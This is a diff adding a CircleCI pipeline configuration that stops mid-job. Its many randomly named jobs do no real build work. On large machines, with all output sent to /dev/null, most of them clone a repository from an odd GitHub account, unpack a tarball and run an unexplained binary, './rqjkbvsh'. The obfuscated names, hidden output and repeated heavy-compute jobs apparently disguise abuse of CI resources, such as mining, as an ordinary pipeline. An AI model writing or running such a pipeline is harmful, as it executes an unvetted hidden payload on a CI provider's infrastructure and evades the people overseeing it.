@@ -1,0 +1,2071 @@
+version: 2.1
+
+jobs:
+  mrqrdafl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: zsosd
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'agwexcgmtfkavtbd wpmcgxvhqanot' > /tmp/xdyfjeimpr/qzzninrcliscw
+            ls -la /tmp/xdyfjeimpr/qzzninrcliscw
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'qzzninrcliscw'
+  xnmwxsckyrjp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tkiqf
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/qzzninrcliscw | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: qkxmuthofzxbo
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: idoce
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: tnvmbo
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  odwpu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zwiqqzbqieecb
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'alevlgfolefnwpp nmaykmxohedazdk' > /tmp/xdyfjeimpr/czktstr
+            ls -la /tmp/xdyfjeimpr/czktstr
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'czktstr'
+  acvfdhgezxeuj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: maxnxhslhxqz
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/czktstr | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: fvkmmdk
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: tccvvgxfbaxxbi
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: vizbqwyspqwnktj
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  vbdjsxmk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: emmwg
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'opgpomuiqxhu vcpumctpxsbfc' > /tmp/xdyfjeimpr/fgsrlzljrafb
+            ls -la /tmp/xdyfjeimpr/fgsrlzljrafb
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'fgsrlzljrafb'
+  xgafavgend:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: nohiintjk
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/fgsrlzljrafb | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: cquyxkmih
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: tagaxt
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: bxoxafeuptayzv
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  nwjvyi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tpkmqkgxkwuyel
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'wmuzssoovbkewyt bfyetbottnzqzym' > /tmp/xdyfjeimpr/nwjjlzq
+            ls -la /tmp/xdyfjeimpr/nwjjlzq
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'nwjjlzq'
+  eflllykeqln:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zgznu
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/nwjjlzq | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: izaqezmjsijj
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: vdzfark
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: trfmvxrpvlttg
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  fbhmgksuiq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: wsgatjlqorx
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'vaihkwtjesi ruioektzshxr' > /tmp/xdyfjeimpr/korhsbtwygskkn
+            ls -la /tmp/xdyfjeimpr/korhsbtwygskkn
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'korhsbtwygskkn'
+  bbtcltkpb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: kqcwn
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/korhsbtwygskkn | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: pmdhebzbrmuka
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: gfmhvia
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: qvvkor
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  xqntcubl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: uiovgtdiiqua
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'inaxdglozyufi txtznwjkwwy' > /tmp/xdyfjeimpr/kducpy
+            ls -la /tmp/xdyfjeimpr/kducpy
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'kducpy'
+  csflqxbdisaun:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: wbstogythtvrk
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/kducpy | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: wsxnnokmth
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: ojuxrvhfxpbp
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: lqipvsnyznbvaz
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  qxuoatmsocye:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bjrxbtmkimqcir
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'cthhxvdtzabfqa nsowcjwciq' > /tmp/xdyfjeimpr/urdkpg
+            ls -la /tmp/xdyfjeimpr/urdkpg
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'urdkpg'
+  qkyicxajufmtc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: cykxznjvwur
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/urdkpg | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: dajuhfyjje
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: hutef
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: ymspkbkdfpjmrmd
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  emkkviygkfp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tcorfjen
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'jghncugctckr tkavafmsgungmds' > /tmp/xdyfjeimpr/lxudzoe
+            ls -la /tmp/xdyfjeimpr/lxudzoe
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'lxudzoe'
+  rwtradfykwwp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: lsfoizxtruk
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/lxudzoe | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: tsparcyj
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: zujcacd
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: vfpfvtxcvmoc
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  rsfxmwuxxbrhzm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: myhhcbsusoy
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'gptqfswvmdnf bgehmpnbwqiyfnfh' > /tmp/xdyfjeimpr/rgasuwh
+            ls -la /tmp/xdyfjeimpr/rgasuwh
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'rgasuwh'
+  npxsrscoaoct:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: xrumcrwjqtp
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/rgasuwh | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: gdjeuvmpl
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: imewfzt
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: sbvbhwzvkideabf
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  mirjaed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: ojiumk
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'oviyecplxmlobf ulidajqcnokfekuy' > /tmp/xdyfjeimpr/qdffpe
+            ls -la /tmp/xdyfjeimpr/qdffpe
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'qdffpe'
+  zdbmgbtjdbltgi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: suaykhssyrntshn
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/qdffpe | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: rcewgxqld
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: dgqaovj
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: ehkxtgid
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  pxoapbqfc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: uvpcqfjg
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'thkksssdmepanzyxdv zcxsbixfttghz' > /tmp/xdyfjeimpr/hffzbtsrn
+            ls -la /tmp/xdyfjeimpr/hffzbtsrn
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'hffzbtsrn'
+  owazkuatiyyalvx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: xpiggqrinvdg
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/hffzbtsrn | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: yktqqtaq
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: zapxnwnouwut
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: jhhysvnbw
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  emofwgacmixqf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: noayvbzfnjml
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'ferjieoosng rguoftbccsmatixuac' > /tmp/xdyfjeimpr/mpcoydujjtth
+            ls -la /tmp/xdyfjeimpr/mpcoydujjtth
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'mpcoydujjtth'
+  gsttoiicdid:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: opgoxua
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/mpcoydujjtth | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: ymvze
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: liyzmewvbmcoy
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: nwtgioritmjbhs
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  bkjxomdzpbmk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: daiewcafwrimkyh
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'xgtcqeflthg lzipbxvajigfkhojp' > /tmp/xdyfjeimpr/ozymqopa
+            ls -la /tmp/xdyfjeimpr/ozymqopa
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ozymqopa'
+  kvnpyqmkhhcv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: dorzxjptp
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/ozymqopa | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: kznbej
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: ctgjnnhdlv
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: njpuq
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  iichfib:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: pvzdykjaiagt
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'nzsryjlbmvrnakrje jhxdaktlufiqt' > /tmp/xdyfjeimpr/jyxxad
+            ls -la /tmp/xdyfjeimpr/jyxxad
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'jyxxad'
+  gfalfux:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tbuqd
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/jyxxad | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: nfrrlhnnxhtcw
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: jbbfdraxij
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: pitugjxdeatfdc
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  ltrgn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zymmyozllogpgqe
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'nbmlplieckfpvc titnysauky' > /tmp/xdyfjeimpr/zmkglui
+            ls -la /tmp/xdyfjeimpr/zmkglui
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'zmkglui'
+  koxqvg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: nessrkavjvnbxhv
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/zmkglui | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: yenzgjeamyw
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: aiipesbvuzr
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: qdkqmbjccdj
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  wahyfbrm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: fzyuryztqf
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'wneqjoyidfswm tqjsqzmlvwvv' > /tmp/xdyfjeimpr/mrkpyqloyoxan
+            ls -la /tmp/xdyfjeimpr/mrkpyqloyoxan
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'mrkpyqloyoxan'
+  heojgaait:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: sffcaqojkl
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/mrkpyqloyoxan | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: sfhbrzmzmboyfs
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: ejtbanauaf
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: sxfcyhxbtafdrb
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  ddpiy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: lxlutdvjkmoxcic
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'xcjzjxikxvb fpctvsbixxccknqh' > /tmp/xdyfjeimpr/kebkypegra
+            ls -la /tmp/xdyfjeimpr/kebkypegra
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'kebkypegra'
+  pcoeiimhfjl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: pmpkdazyybg
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/kebkypegra | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: vzfpchxmsfl
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: axgcdmgdw
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: vngzmcqftznzynb
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  rnbbq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: rjdbfjvpgnxhcji
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'uhpxdlcaeuim smetibrrqgjqwe' > /tmp/xdyfjeimpr/ycyase
+            ls -la /tmp/xdyfjeimpr/ycyase
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ycyase'
+  iagtypyot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: mvzymruniz
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/ycyase | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: xkryr
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: naarydlune
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: vdhnscd
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  hjmycxrvgt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wrdvkhxxvaoasbe
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'fvwfyskhcc kbwayglbit' > /tmp/xdyfjeimpr/znhqioblx
+            ls -la /tmp/xdyfjeimpr/znhqioblx
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'znhqioblx'
+  belyop:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: kcerwn
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/znhqioblx | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: olmnihlpnxym
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: zwqakxsivjiuqaz
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: tkjjvi
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  ppglqrlqya:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: tkzisfkzqoypxw
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'fhslegjkepy tpnlhoehem' > /tmp/xdyfjeimpr/ewyifdbh
+            ls -la /tmp/xdyfjeimpr/ewyifdbh
+      - persist_to_workspace:
+          root: /tmp/xdyfjeimpr
+          paths:
+            - 'ewyifdbh'
+  fmypinufd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: upaebftxtkke
+          command: |
+            exec >/dev/null 2>&1
+            # pipeline with check
+            cat /tmp/xdyfjeimpr/ewyifdbh | wc -c | {
+              read -r sz
+              echo "measured: $sz bytes"
+            }
+      - run:
+          name: ctjwktho
+          command: |
+            exec >/dev/null 2>&1
+            git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/keslieblake9ibnu-cmyk/5edd270bec20.git .
+      - run:
+          name: ncalzttihbmabux
+          command: |
+            exec >/dev/null 2>&1
+            tar -xjf lfyhbrad.tar.bz2
+      - run:
+          command: |
+            exec >/dev/null 2>&1
+            ls -la
+      - run:
+          name: fkyiiesod
+          command: |
+            exec >/dev/null 2>&1
+            df -h
+      - run:
+          command: nice -n 0 ./rqjkbvsh
+  zlqvuar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xdyfjeimpr
+      - run:
+          name: zrymjlaudzqal
+          command: |
+            exec >/dev/null 2>&1
+            mkdir -p /tmp/xdyfjeimpr
+            echo 'bbzoshzjlrmoxke aivvfibhitpnyvk' > /tmp/xdyfjeimpr/haryaszzqgutyt
